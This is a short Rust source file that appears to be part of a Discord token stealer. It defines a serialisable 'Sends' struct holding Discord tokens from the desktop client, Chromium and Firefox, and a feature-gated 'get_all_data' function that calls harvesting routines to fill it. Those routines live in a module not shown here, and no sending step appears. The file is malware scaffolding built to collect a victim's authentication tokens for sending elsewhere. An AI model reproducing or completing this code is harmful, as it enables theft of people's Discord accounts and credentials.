use serde_derive::{Deserialize, Serialize};

#[cfg(feature = "functions")]
mod all_data;

#[derive(Deserialize, Serialize, Clone)]
pub struct Sends {
    pub discord_client_token: Option<String>,
    pub discord_chromium_token: Option<String>,
    pub discord_firefox_token: Option<String>,
}

#[cfg(feature = "functions")]
impl Sends {
    pub fn init() -> Sends {
        Sends {
            discord_client_token: None,
            discord_chromium_token: None,
            discord_firefox_token: None,
        }
    }
}

#[cfg(feature = "functions")]
pub fn get_all_data() -> Sends {
    let mut sends = Sends::init();
    #[cfg(feature = "discord-client")]
    sends.discord_client();
    #[cfg(feature = "discord-chromium")]
    sends.discord_chromium();
    #[cfg(feature = "discord-firefox")]
    sends.discord_firefox();
    sends
}
